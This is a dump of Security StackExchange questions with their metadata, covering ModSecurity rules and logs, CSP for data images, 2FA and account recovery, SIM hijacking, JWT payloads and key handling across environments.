<th>WebAPI Consumer</th>
<th>WebAPI Service</th>
</tr>
</thead>
<tbody>
<tr>
<td>Production Environment (WebAPI Consumer Production Private Key)</td>
<td>Production Environment (WebAPI Consumer Production Public Key)</td>
</tr>
<tr>
<td>Pre-Production Environment (WebAPI Consumer Production Private Key)</td>
<td>Staging Environment (WebAPI Consumer Production Public Key)</td>
</tr>
</tbody>
</table>
</div>
<p>The web API is located in an extranet with four web methods, two of which allow the consumer to modify data in our database. The server is a Windows server and the web server is IIS.</p>
<p>The concerns are that the Pre-Production Server has access to the Production Server, when it should only have access to the Staging Server.</p>
<p>Also, that the Production Server Private Key has been loaded onto a Pre-Production Server.</p>
<p>Shouldn't different keys be used in different environments?</p>
<p>Here are some STIGs that I found that &quot;might&quot; be applicable.</p>
<p><a href=""https://i.stack.imgur.com/kLH4Y.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/kLH4Y.png"" alt=""enter image description here"" /></a></p>
<p>EDIT: Adding this overview diagram demonstrating the answer.</p>
<p><a href=""https://i.stack.imgur.com/E1lsQ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/E1lsQ.png"" alt=""enter image description here"" /></a></p>
","236221","","236221","","2022-12-07 14:37:49","2022-12-07 14:37:49","Would the configuration described below violate any Security Technical Implementation Guides (STIGs)?","<public-key-infrastructure><account-security>","1","8","","","","CC BY-SA 4.0"
"54501","1","54507","","2014-03-30 19:19:00","","1","3071","<p>I'm looking for an online training lab for pentesting/hacking and security.</p>

<p>I've found one at <a href=""http://www.hacking-lab.com"" rel=""nofollow"">hacking-lab</a> but it's seems troublesome to work with and it has some issues on VPN server authentication.</p>

<p>Someone knows about something similar? </p>

<p>Or something like <strong><a href=""http://ghostinthelab.wordpress.com/2011/09/06/hackademic-rtb1-root-this-box/"" rel=""nofollow"">Hackademic RTB1</a> and RTB2</strong>?</p>

<p>I wish for more resources to learn with. </p>

<p>thx in advance.</p>
","43070","","13768","","2014-03-30 20:10:27","2014-03-31 13:10:29","Someone knows about online labs?","<penetration-test><security-theater>","4","1","","2014-03-31 14:06:42","","CC BY-SA 3.0"
"194909","1","","","2018-10-02 11:25:43","","2","1413","<p>I am trying to get an image that is within JavaScript to work with our CSP. I have <a href=""https://security.stackexchange.com/questions/94993/is-including-the-data-scheme-in-your-content-security-policy-safe"">read</a> that using <code>data:</code> (even in <code>img-src</code>) is an XSS risk so I'm trying to avoid that.</p>

<p>Because it is called from within a .js file I'm not sure how to get it working properly. I've tried using the <code>sha256-base64-value</code> value outlined here:</p>

<p><a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src"" rel=""nofollow noreferrer"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src</a></p>

<p>I have tried the sha256 hash of the base64 value, and the sha256 of the downloaded image (created from the base64 value). E.g. within nginx CSP:</p>

<blockquote>
  <p>img-src 'self' fda3f82c94742ce8331f51c2bb0e7f45c7da67e1d8618dc345b77a8dcfc6686e-iVBORw0KGgoAAAANSUhEUgAAABQAAAAeCAYAAAAsEj5rAAAAU0lEQVR42u3VOwoAMAgE0dwfAnNjU26bYkBCFGwfiL9VVWoO+BJ4Gf3gtsEKKoFBNTCoCAYVwaAiGNQGMUHMkjGbgjk2mIONuXo0nC8XnCf1JXgArVIZAQh5TKYAAAAASUVORK5CYII=;</p>
</blockquote>

<p>and</p>

<blockquote>
  <p>img-src 'self' 3c1ed8cea465b0a63ee09ce0a1013be0e482752f91c32fcd59b3cae2627f764f-iVBORw0KGgoAAAANSUhEUgAAABQAAAAeCAYAAAAsEj5rAAAAU0lEQVR42u3VOwoAMAgE0dwfAnNjU26bYkBCFGwfiL9VVWoO+BJ4Gf3gtsEKKoFBNTCoCAYVwaAiGNQGMUHMkjGbgjk2mIONuXo0nC8XnCf1JXgArVIZAQh5TKYAAAAASUVORK5CYII=;</p>
</blockquote>

<p>I get the following error in Chrome's console:</p>

<blockquote>
  <p>Refused to load the image 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAeCAYAAAAsEj5rAAAAU0lEQVR42u3VOwoAMAgE0dwfAnNjU26bYkBCFGwfiL9VVWoO+BJ4Gf3gtsEKKoFBNTCoCAYVwaAiGNQGMUHMkjGbgjk2mIONuXo0nC8XnCf1JXgArVIZAQh5TKYAAAAASUVORK5CYII=' because it violates the following Content Security Policy directive</p>
</blockquote>

<p>How can I get this data image working with a CSP securely?</p>
","178944","","178944","","2018-10-02 15:12:49","2018-10-02 15:12:49","Data image with CSP","<web-application><content-security-policy>","0","8","","","","CC BY-SA 4.0"
"129529","1","","","2016-07-08 08:15:26","","-1","2373","<p>I'm trying to understand this strategy of authentication that I'm using to access resources of an enterprise.</p>

<p>Basically, they have given me <code>clientId</code> and <code>clientSecret</code>, which I use to generate <code>deviceId</code> and <code>deviceToken</code>. Following that, I use them in web services call to get <code>authToken</code> and use it in Authentication header <code>bearer access_token</code> to access content.</p>

<p>My question is</p>

<ol>
<li><p>What kind of authentication is this? It doesn't look like OAuth to
me because they have callback handlers.</p></li>
<li><p>Can you explain <code>clientId</code>, <code>clientSecret</code>, <code>deviceId</code> and <code>deviceToken</code>?
A little guideline on what parts I need to know in order to build an
authentication system like that?</p></li>
</ol>
","116515","","6253","","2016-07-09 12:38:19","2016-07-09 12:40:17","What is this type of authentication with device id and token?","<authentication><oauth><account-security>","1","3","","","","CC BY-SA 3.0"
"266862","1","","","2022-12-07 01:18:03","","2","44","<p>References:</p>
<ol>
<li>Yubico’s Take on U2F Key Wrapping
<a href=""https://www.yubico.com/blog/yubicos-u2f-key-wrapping/"" rel=""nofollow noreferrer"">https://www.yubico.com/blog/yubicos-u2f-key-wrapping/</a></li>
<li>Key generation
<a href=""https://developers.yubico.com/U2F/Protocol_details/Key_generation.html"" rel=""nofollow noreferrer"">https://developers.yubico.com/U2F/Protocol_details/Key_generation.html</a></li>
<li>Discoverable Credentials / Resident Keys
<a href=""https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/Resident_Keys.html"" rel=""nofollow noreferrer"">https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/Resident_Keys.html</a></li>
<li>FIDO 2 compared to FIDO U2F
<a href=""https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/FAQ.html"" rel=""nofollow noreferrer"">https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/FAQ.html</a></li>
</ol>
<p>How are Yubico private keys (unique for each Relaying Party (RP)) generated and stored for a FIDO U2F credential session for the 5 Series Keys vs the Bio Keys.  Do they both use key wrapping of the private keys?  I’m pretty sure all the 5 Series Keys perform key wrapping for FIDO U2f (Reference 1/2).</p>
<p>I’ve been in contact with some other vendors of Bio Keys and they’ve indicated that the RP private key (FIDO U2F) is stored on the device and is not key wrapped for transmission to the RP.  This led me to wonder, if the Yubikey Bio stores the RP private key or key wraps for FIDO U2F?</p>
<p>From Ref 3/4, I know it is a different situation for FID02 Passwordless authentication.</p>
","286317","","","","","2022-12-07 01:18:03","Yubikey Private Key Generation & Storage 5 Series vs Bio Key","<account-security><yubikey><u2f><fido>","0","0","","","","CC BY-SA 4.0"
"195091","1","","","2018-10-05 00:52:22","","0","388","<p>Does anyone know how Safari or Chrome stores a www.icloud.com session authentication after logging in and passing 2-factor authentication?  Is it stored in an encrypted cookie?</p>

<p>My concern is, if logging into iCloud from someone else's device (or browser), this session cookie could be stored. A malicious person, perhaps unknown to the system owner, could grab the session cookie and username/password from logged keystrokes. Now this person has bypassed 2-factor authentication and can access: </p>

<p><strong>iCloud Keychain</strong>, iCloud iOS Backup (with password attack) and much more iCloud data including calendar, contacts, notes, photos, etc...</p>

<p>It seems like a big risk because many people store website passwords, including passwords to encrypted backups (Time Machine), on the keychain. This type of attack could expose all of this.</p>

<p>Appreciate your input and any steps you take to avoid this.</p>
","187220","","187794","","2018-10-06 16:07:26","2023-08-12 08:08:41","iCloud Security Concern: browser session authentication storage after 2-factor?","<authentication><password-management><key-management><account-security><keyloggers>","1","0","","","","CC BY-SA 4.0"
"129594","1","","","2016-07-08 22:00:14","","2","1497","<p>With all of these recent breaches, I have been thinking about security best practices.</p>

<p>One thing I was thinking about was the fact that some sites allow you to log into a site using your <strong>EMAIL OR USERNAME, or even JUST EMAIL.</strong></p>

<p>To me, this sounds like a big risk, because you are now given 2 separate vectors to attack from, one from knowing the email, or one from knowing the Username.  </p>

<p>But lets take this a step further, and assume we don't know the email, but do know the Username.</p>

<p>Lets say their password was cracked, and someone is in the account, which gives the attacker access to the user's ""Registered Email Address.""  Or even if the attacker was able to SQLi the site's database and were able to get a list of email addresses and username/pw combos.  This means the attacker can now do a lot of damage over a wide area.</p>

<p>With email listed, attackers now have access to new data that previously was not known.  Assuming these people aren't smart, and reuse their passwords, a hacker now has access to their email account.  Even if they didn't reuse their password we now have an email in order to start attacks. </p>

<hr>

<p>From there, we also have 2FA, which I'm not 100% how it works, but it seems to require authentication by using your mobile device, either a code or some sort of login from the device.</p>

<p>The thing is, I've heard that if someone sets up 2FA on your account, you can be locked out....  So what use does your email have now, besides providing additional information about you, that you really do not need.</p>

<hr>

<p>My questions are.</p>

<ol>
<li><p>Is providing an email address these days actually useful, or is it a security risk due to providing additional information that could be harmful?</p></li>
<li><p>If 2FA is enabled, and we get locked out of our account, would our email be able to save us?  It seems 2FA has a higher permission level than the normal password reset of an email, so even if you did reset your password, the 2FA would not allow you in (granted I'm not sure how to reset 2FA).</p></li>
</ol>

<p>Since an email address' only function (usually) is to provide a way to reset your password, it seems to me, that if we register an account, and then set up 2FA on a mobile device the email address is really not needed.  Password resets could be sent to that 2FA device, so that it could change your password, without ever having to send it to an email... (not sure if this is done now, but figure this could be implemented).</p>

<p>So am I wrong to think that Emails are dangerous to provide these days, and that we could possibly accomplish what we want with just 2FA?</p>

<hr>

<p>EDIT:  I just want to point out, that the above was written under the assumption that email addresses/usernames are not Hashed.  After reading a few questions on here regarding hashing emails, it seems some people do it.</p>

<p>I'm curious how many people recommend hashing an email address?  What about a username?</p>

<p>Personally I like hashing as much important data as I can, but not sure what ""Security best practices"" are, or what a lot of people do.</p>
","106817","","106817","","2016-07-10 06:39:23","2020-10-08 17:23:20","Is there more of a security risk by providing an email when creating a new account?","<authentication><email><risk><account-security>","5","0","","","","CC BY-SA 3.0"
"195160","1","","","2018-10-05 19:41:45","","3","580","<p>Scenario:</p>

<ul>
<li>ModSecurity with a ""default"" or ""generic"" configuration (like the one that might be provided by shared hosting providers, for example).</li>
<li>Generic web application (custom, uncommon, or unknown), for which specific rules are not provided by ModSecurity.</li>
</ul>

<p>How useful is ModSecurity in this situation? What percentage of attacks is it going to prevent? What kind of attacks?</p>

<p>Reason for asking this question: there is a web application that, to avoid issues with ModSecurity default rules, suggests to <em>disable</em> it for this specific application if it is causing any trouble. That doesn't sound like great advice to me, however I'm not sure if the default ModSecurity configuration is actually significantly more useful than having no ModSecurity at all (disabled).</p>
","175681","","","","","2019-04-16 20:02:00","How useful is the default configuration of ModSecurity for a generic web application?","<web-application><waf><mod-security>","3","1","0","","","CC BY-SA 4.0"
"195196","1","","","2018-10-06 08:56:19","","1","144","<p>I am building a game similar to HQ trivia, that when someone gives all the correct answers at the end of the game he or she gets money sent to their Paypal account, my concern is obviously security.</p>

<p>The game will send an HTTPS request to a backend API which will then make a request to the Paypal API and make a payment of X dollars to the player's Paypal account.</p>

<p>How do I protect the game from someone sending fraudulent manual HTTP requests to the backend API, and consequently sending let's say 1M transactions of $10 to their own Paypal account?</p>

<p>These are some security layers I came up with so far:
 - CSRF
 - Human interaction accepting or declining every payment before taking place
 - Algorithm to filter consequent HTTP request from the same IP or to the same Paypal account</p>

<p>I assume not but, would that be enough?</p>
","188262","","","","","2018-10-06 08:56:19","Automatic Paypal payment through API","<csrf><account-security><api><paypal><money>","0","2","","","","CC BY-SA 4.0"
"266975","1","266985","","2022-12-12 01:53:06","","2","429","<p>I have a false positive involving the content of one of my cookies:</p>
<pre><code>ModSecurity: Warning. Matched &quot;Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `REQUEST_COOKIES:xid' (Value: `ab92d4a54edee30a194329d6bfcf1e%3A%242y%2410%24tvyJRRIx6WJyE3.1XQ%2FWpusT3vkKd8y2g4SuUr.NsrsqEJb%2FLO (3 characters omitted)' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf&quot;] [line &quot;101&quot;] [id &quot;930120&quot;] [rev &quot;&quot;] [msg &quot;OS File Access Attempt&quot;] [data &quot;Matched Data: .nsr found within REQUEST_COOKIES:xid: ab92d4a54edee30a194329d6bfcf1e:$2y$10$tvyJRRIx6WJyE3.1XQ/WpusT3vkKd8y2g4SuUr.NsrsqEJb/LOuki&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-lfi&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/255/153/126&quot;] [tag &quot;PCI/6.5.4&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/***/***/*********/*******/&quot;] [unique_id &quot;167009817975.334513&quot;] [ref &quot;o76,4v486,103t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin&quot;]
</code></pre>
<p>It looks like my cookie &quot;xid&quot; is being flagged because the randomly generated encrypted string in the cookie variable contains &quot;.nsr&quot;. I solved the underlying issue to prevent cookies like this from being generated in the future. Users who currently have that flagged cookie string will receive a new one on their next page visit, but I still need a rule to allow users to visit the page without a 403 error.</p>
<p>I tried setting up a temporary rule:</p>
<pre><code>SecRule REQUEST_COOKIES &quot;xid&quot; \
    &quot;id:100202,\
    phase:1,\
    pass,\
    nolog,\
    ctl:ruleEngine=DetectionOnly&quot;
</code></pre>
<p>Unfortunately, this isn't working. What is the proper SecRule to whitelist a specific cookie name like &quot;xid&quot;?</p>
<p>Thanks</p>
","285362","","","","","2022-12-12 11:59:40","ModSecurity: How to whitelist specific cookie name?","<mod-security>","1","0","","","","CC BY-SA 4.0"
"129734","1","129739","","2016-07-11 14:29:03","","0","161","<p>I have an issue where our app had an app scan issue.  The application is using GET to retrieve info for a user profile page (written in HTML/Javascript).  This page has the user's security questions and answers, but the answers are in plain text in the raw response.</p>

<p>What is the best way to handle this?  The user needs to be able to edit the answers (they are masked out) but we don't want to be open to attack, of course.</p>

<p>Is the best choice to use some fake text to show in the box and then check that fake text on save?  This option doesn't show the true number of characters for what they originally typed in.  Is there a better method?</p>

<p>I checked <a href=""https://security.stackexchange.com/questions/92023/should-i-show-the-security-answer-when-the-user-goes-back-to-edit-the-field"" title=""this"">this security.stackexchange question</a> but the answer doesn't say what method is best for this scenario.</p>
","77743","","-1","","2017-03-17 13:21:41","2016-07-11 15:24:54","How to GET security answer values via AJAX for user edit","<web-application><javascript><.net><ajax><account-security>","1","3","","","","CC BY-SA 3.0"
"267182","1","","","2022-12-20 08:23:13","","1","24","<p>We are developing an application that is to be used internally at our clients companies, but will be exposed as a public accessible website.</p>
<p>We have some clients who wish to use local accounts on our website (as opposed to some SSO solution like Azure AD), and we're discussing how to set up the account creation flow to maximize security, since it is one of our salespoints.</p>
<p>When a new client gets access to the system, they get the credentials for a &quot;root&quot; administrator account, and we then leave it up to them to create all other accounts the clients wish to have. Once an account is created, they can potentially immediately access some pretty confidential information from the company that other accounts may have shared with them.</p>
<p>One suggestion was to have the following workflow:</p>
<ol>
<li>Administrator creates the user account (fills in email etc.)</li>
<li>While creating the user, the system sends a welcome email to the user</li>
<li>After creation, the administrator is shown an OTP for the user, which the administrator then can send to the user via some* other channel</li>
<li>When the user logs in the first time, they are forced to reset their password and verify their email</li>
</ol>
<p>(*The idea is that the administrator will send it via Teams, Slack or some other IM app)</p>
<p>This approach uses multiple paths to communicate the login information to the user (email sent from our email server, password sent via IM, the company's internal email server, or some other means), guarding against sending the login information to someone unintended. The drawback is that it is very heavy on the administrator, since they have to communicate the password to each user.</p>
<p>Another approach would be:</p>
<ol>
<li>Administrator creates the user account (fills in email etc.)</li>
<li>The system sends a welcome email to the user</li>
<li>The user registers themselves with the system (enters email and password), only emails that the administrator has created in step 1 are accepted, and the user is required to verify their email</li>
</ol>
<p>This approach is a lot lighter on the administrator, but also does not have any safeguards that the person signing up with the email is the intented person (e.g. if the administrator mistypes the email or the emails are intercepted).</p>
<p>The questions are:</p>
<ol>
<li>Is option 1 so much better than option 2 from a security view?</li>
<li>Is option 2 is good enough (are we just overcomplicating things/being paranoid)?</li>
<li>Are there other account creation flows that are better suited for internal applications?</li>
</ol>
","30458","","","","","2022-12-20 08:23:13","Account creation flow for semi-internal applications","<account-security><user-management>","0","2","","","","CC BY-SA 4.0"
"129802","1","","","2016-07-11 22:20:19","","0","88","<p>We have the following use case:</p>

<p>Users can self register for a business account by filling a validation form with their ID, first name, last name, and DOB. ID is something that only the user knows ahead of time. Users have 5 attempts to match all of their information.</p>

<p>We are planning to maintain a couple of tables in a database in which we store the validation attempts:</p>

<pre><code>Table 1 columns: id, attempts
Table 2 columns: id, fname, lname, dob
</code></pre>

<p>Table 1 and 2 have a one-many relationship. Here's an example of what happens if user tries to guess the firstname, last name and DOB 5 times before its locked. The application checks table 1's attempts column and if it's 5 or more than 5 for a specific ID, the user account (with that specific ID) is treated as locked. </p>

<pre><code>table 1
id   attempts
1234  5

table 2
id    fname   lname  dob
1234  john     doe   19900101
1234  jane     doe   19900101
1234  jason    doe   19900101
1234  john     dae   20010102
1234  roger    smith 19960101
</code></pre>

<p>The problem with the above approach is that we are only tracking the failed attempts by ID. What if user tries to change the ID and attack? By keeping the first name, last name and DOB the same and guessing the ID?</p>

<p>Maybe I need to rethink the validation table design and my approach to solve the problem of user trying to guess ID? Or is there a better way to think about this problem?</p>
","37106","","86652","","2016-07-12 00:23:12","2016-07-12 00:23:12","Proper way to document and log brute force attacks when creating a user account","<attacks><compliance><validation><account-security>","0","4","","","","CC BY-SA 3.0"
"195354","1","195356","","2018-10-09 04:58:33","","2","561","<p>So the question was originally asked as a part of the UX question <a href=""https://ux.stackexchange.com/questions/121378/otp-verification-which-approach-will-lead-to-better-and-consistent-ux-screen"">here</a>. </p>

<p>My question is that, Are there any security risks involved when I auto-submit the OTP? Currently, I'm limiting the number of verification attempts from the backend side. </p>

<p>What are the points that one should keep in mind while auto-submitting the OTP? I'm designing the app for the mobile platform.</p>
","138353","","39616","","2018-10-09 05:20:10","2018-10-09 05:20:10","Security implications of auto-submitting OTP?","<authentication><attack-prevention><account-security><one-time-password><risk-analysis>","1","0","","","","CC BY-SA 4.0"
"195422","1","","","2018-10-10 03:53:45","","2","267","<p>I have often thought about the fact that when intimate relationship partners live together they eventually tend to sneak over your shoulder and gain access to your password on either your mobile phone or your pc.</p>

<p>Furthermore, swipable screen locks have been invented on smartphones because people get fed up typing the password each time, but these are easier to observe and break.</p>

<p>So, with fingerprints this problem is partially taken care of, but what if, while you are asleep, your partner grabs your phone and finger and uses it to unlock your phone, and then read, or even modify, or even delete your data?</p>

<p>For this reason, I was thinking a solution would be a simultaneous fingerprint reader and iris scanner to make sure you are actually awake while unlocking and using your phone.</p>

<p>Has this been implemented anywhere?</p>

<p>What other solutions to this problem might be available?</p>

<p>Thanks.</p>
","188528","","188528","","2018-10-10 05:02:29","2020-08-30 10:01:20","Smartphone fingerprint plus iris scanning for login","<authentication><account-security><authorization><spoofing><smartphone>","1","7","","","","CC BY-SA 4.0"
"267242","1","267243","","2022-12-22 11:28:27","","0","105","<p>I'm writing a simple website to help me grasp cybersecurity practices and I decided to stick to JWT tokens, but I have no idea about what I should write on the payload.</p>
<p>I've seen on many JWT token generators &quot;Claim email, domain, etc.&quot;, but why is that necessary? Couldn't the user's UUID just be stored there and other information be looked up server-side?</p>
","287083","","6253","","2022-12-22 12:25:37","2022-12-22 12:33:58","How should JWT tokens be made?","<account-security><jwt>","1","5","","","","CC BY-SA 4.0"
"195499","1","","","2018-10-10 22:25:43","","9","381","<p>According to the Google information page here: <a href=""https://support.google.com/accounts/answer/6103523"" rel=""noreferrer"">https://support.google.com/accounts/answer/6103523</a></p>
<blockquote>
<p>If you don’t have another second step or forgot your password</p>
<p>Note:
2-Step Verification requires an extra step to prove you own an
account. Because of this added security, it can take up to 3-5
business days for Google to make sure it’s you trying to sign in.</p>
<p>Follow the steps to recover your account. You'll be asked some
questions to confirm it's your account. Use these tips to answer as
best you can.</p>
<p>You may be asked: To enter an email address or phone
number where you can be reached. To enter a code sent to your email
address or phone number. This code helps make sure you can access that
email address or phone number.</p>
</blockquote>
<p>This seems to indicate that even if I have two Google Titan keys (two are required for Google's Advanced Protection Program), someone can just fill in a form to claim that the keys are lost, and then gain access if they can intercept access to texts sent to my mobile phone number. This seems to indicate that the attacker can just wait until they think I'm on vacation and not paying attention, and then gain access to my account?</p>
<p>Is there any way to lock the account down so that my cell provider is not the weakest link?</p>
","147364","","-1","","2020-06-16 09:49:05","2018-12-03 23:04:01","Are FIDO U2F keys (like dual Yubikeys or dual Google Titan keys) undermined by the Google account recovery process?","<google><account-security><u2f><account-lockout><fido>","2","0","","","","CC BY-SA 4.0"
"195600","1","195611","","2018-10-12 15:31:59","","2","347","<p>There are several posts like these:</p>

<p><a href=""https://medium.com/@N/how-i-lost-my-50-000-twitter-username-24eb09e026dd"" rel=""nofollow noreferrer"">https://medium.com/@N/how-i-lost-my-50-000-twitter-username-24eb09e026dd</a></p>

<p><a href=""https://motherboard.vice.com/en_us/article/5984zn/listen-to-sim-jacking-account-ransom-instagram-email-tmobile"" rel=""nofollow noreferrer"">https://motherboard.vice.com/en_us/article/5984zn/listen-to-sim-jacking-account-ransom-instagram-email-tmobile</a></p>

<p>How does one protect themselves against an attack like this?</p>

<p>What are the specific logistics behind services or phones or technologies that can be used to create a structure which isn't vulnerable to this? And how does the data flow through it?</p>

<p>Also, how do high risk people like celebrities handle stuff like this? </p>

<p><strong>Edit</strong></p>

<p>These are the things that are most critical to protect</p>

<ol>
<li>Cellular account if used for any SMS (but maybe it can be avoided entirely by only using email recovery?)</li>
<li>A ""root"" email account that is for recovery</li>
<li>Domain accounts (eNome, namecheap, etc)</li>
</ol>
","188709","","188709","","2018-10-12 17:29:06","2018-10-12 17:43:42","How do I protect myself against SIM hijacking/social engineering?","<phishing><account-security><social-engineering><sms><simcard>","2","0","","","","CC BY-SA 4.0"
"195661","1","","","2018-10-13 17:11:32","","-1","172","<p>which antivirus best for window 10 for security and virus protection specially for hp laptops.</p>
","188819","","","","","2018-10-13 18:18:51","which antivirus best for window 10 on hp laptops?","<antivirus><account-security>","1","1","","2018-10-13 19:30:40","","CC BY-SA 4.0"
"195705","1","","","2018-10-14 17:25:34","","1","768","<p>Currently, in our SIEM environment, we are attempting to reduce noise and any non-actionable items. One of the most frequent items we receive on a weekly basis is a report based on excessive member and server authentication failures.</p>

<p>The overall concept is to inform us of any accounts that consistently fail authentication on a host over a 24hr period, where no successful events are seen within the same 24hr period. We often determine the type of failure based on the event code that it is producing as well as the signature/signature ID.</p>

<p>Our standard process is to contact the account or server owner and have he/she investigate what is causing the excessive failures. This process can be rather lengthy and time-consuming and is dependent on analyst communication to the account owner. I'd say 95% of these alerts are not actionable or they are closed after a follow-up SIEM search.</p>

<p>To avoid a possible brute force attack we do monitor these logs. My question is; is there an additional layer of filtering or rules that be tweaked to reduce these logs.</p>

<p>Common Event Codes:</p>

<pre><code>4625 
4776
</code></pre>

<p>Also is there perhaps a different process that can be utilized for monitoring and reporting such excessive accounts. At, the moment we need to create a new tracking ticket for each and every account that meets our current standard and/or threshold. </p>

<p>Through analysis, I would believe that if an analyst can determine if the failure is indeed a brute-force is actionable than we would then complete the required steps. Otherwise, these excessive failures can be reviewed and forwarded to the respected account owner as needed.</p>

<p>Any thoughts on the matter? Thank you!</p>
","188876","","","","","2018-10-19 07:18:55","Manage Logs of Excessive Member and Server Authentication Failures","<brute-force><server><account-security><siem>","1","2","","","","CC BY-SA 4.0"
"267483","1","267488","","2023-01-03 18:04:30","","7","1196","<p>My modsecurity log produces lines like this in section H:</p>
<pre><code>Stopwatch: 1672766910416996 75370993 (- - -)
Stopwatch2: 1672766910416996 75370993; combined=8155, p1=1356, p2=5617, p3=149, p4=895, p5=137, sr=157, sw=1, l=0, gc=0
</code></pre>
<p><code>1672766910416996 75370993</code> is the epoch time in nanoseconds, but:</p>
<ul>
<li>What do <code>sr</code>, <code>sw</code>, <code>l</code> and <code>gc</code> stand for?</li>
<li>What unit of time are <code>p1</code> to <code>p5</code> in?</li>
<li>What is <code>Stopwatch</code> vs. <code>Stopwatch2</code>?</li>
</ul>
<p>If the answers are already documented, I'd appreciate a link.  There are a lot of questions that don't seem to be answered in the modsecurity reference guide.</p>
","118246","","","","","2023-01-03 23:16:54","How do I interpret the ""stopwatch"" lines in modsecurity logs?","<mod-security>","1","0","","","","CC BY-SA 4.0"
"267536","1","267585","","2023-01-06 01:15:50","","4","2017","<p>I received this error in my ModSecurity logs:</p>
<pre><code>ModSecurity: Warning. Matched &quot;Operator `Eq' with parameter `0' against variable `REQBODY_ERROR' (Value: `1' ) [file &quot;/etc/nginx/modsec/modsecurity.conf&quot;] [line &quot;75&quot;] [id &quot;200002&quot;] [rev &quot;&quot;] [msg &quot;Failed to parse request body.&quot;] [data &quot;Request body excluding files is bigger than the maximum expected.&quot;] [severity &quot;2&quot;] [ver &quot;&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/add/submit.php&quot;] [unique_id &quot;167296149027.413348&quot;] [ref &quot;v0,1&quot;]
</code></pre>
<p>From what I understand, the request body exceeds the default <code>SecRequestBodyLimit</code> parameter that is set in the main ModSecurity config. It is not unusual for some users to submit highly formatted listings on this specific page that are larger than the default 131kb request body limit</p>
<p>How do I write a custom exclusion rule to increase <code>SecRequestBodyLimit</code> only for my &quot;/add/submit.php&quot; page on a specific domain? I'm looking for the proper writing of a rule similar to this:</p>
<pre><code>SecRule REQUEST_HEADERS:Host &quot;@pm example.com www.example.com&quot; \
    &quot;id:100001,\
    phase:1,\
    pass,\
    nolog,\
    chain&quot;
    SecRule REQUEST_URI &quot;@pm /add/submit.php&quot; \
    &quot;ctl:requestBodyLimit=1048576&quot;
</code></pre>
<p>The rule above doesn't work and gives me this error:</p>
<pre><code>nginx: [emerg] &quot;modsecurity_rules_file&quot; directive Rules error. File: /etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf. Line: 410. Column: 30. Expecting an action, got:  ctl:requestBodyLimit=1048576&quot; in /etc/nginx/nginx.conf:32
</code></pre>
","285362","","","","","2023-01-09 07:29:47","ModSecurity: How to increase SecRequestBodyLimit for specific website REQUEST_URI?","<mod-security>","2","0","","","","CC BY-SA 4.0"
"267543","1","","","2023-01-06 12:19:23","","2","218","<p>In my place of work we have an on-prem Active Directory with 'staff' accounts. Each of these AD accounts has an associated company email, e.g. john@example.com</p>
<p>Within the same AD we also have 'external' user accounts, e.g. suppliers, contractors etc. This allows the external users to login and access some of our systems using their AD credentials (user number and password). <strong>None of these external users have an email address associated with their AD account.</strong></p>
<p>The only users with an AD email address are 'staff'. There are various reasons why we would like 'external' users to have an email address, e.g. Currently they cannot use the 'send to email' feature of our printers, as they have no associated email.</p>
<p>I have a few questions (I am not an AD administrator or security expert, and I'm not familiar with the email or AD infrastructure.)</p>
<ol>
<li>is it technically possible to associate an external domain email address to our internal AD user accounts (e.g. john@gmail.com)</li>
<li>will doing this pose any security risks / why would AD admins be reluctant to do this</li>
<li>is there a better / safer alternative</li>
<li>does it make is any less secure if its AD on-prem or Azure</li>
</ol>
","265315","","265315","","2023-01-10 19:03:37","2023-01-10 19:03:37","Active Directory and External Email Accounts","<email><account-security><active-directory><user-management><exchange>","0","2","","","","CC BY-SA 4.0"
"195955","1","","","2018-10-18 10:53:08","","2","761","<p>This is a common sight in content security policies:</p>

<pre><code>style-src 'unsafe-inline'
</code></pre>

<p>I know that this ""UI redressing attacks"" that can be use for phishing or just defamation. But are there other threats as well? In particular, I am interested in:</p>

<ul>
<li>Script execution</li>
<li>Data exfiltration</li>
</ul>

<p>Can a liberal CSP for styles lead to any of those? If so, how?</p>
","98538","","","","","2018-10-18 10:53:08","What are the dangers of ""style-src: 'unsafe-inline'""?","<web-application><content-security-policy><css>","0","2","","2018-10-18 13:10:49","","CC BY-SA 4.0"
"130367","1","","","2016-07-18 10:40:20","","1","130","<p>I read about the <a href=""http://www.linuxandubuntu.com/home/ubuntu-forums-hacked-here-is-what-hacker-stole"" rel=""nofollow"">hack at Ubuntu Forums</a> yesterday. Since we hold customer data things like this always makes me worried, and I look to minimise our risk of attack.</p>

<p>There is an option to enable ModSecurity in my CPanel. I assume this is done without breaking anything on the site? But what extra security does this bring against hackers and does it allow notification of hacks?</p>
","117852","","98538","","2016-07-18 11:37:04","2016-07-18 23:31:25","What does ModSecurity bring to my hosting account?","<apache><ubuntu><mod-security>","2","1","","","","CC BY-SA 3.0"
"196029","1","","","2018-10-19 14:41:00","","0","195","<p>I would like to create a Bitcoin Wallet.</p>

<p>Part of the process is to store public and private keys in encrypted form in server database.</p>

<p>All keys I am storing is encrypted using user's <strong>passcode</strong>.</p>

<p><strong>1)</strong> Is it safe to store user's passcode in encrypted form in server database. (Thinking that User might forget his passcode so considering one recovery option)</p>

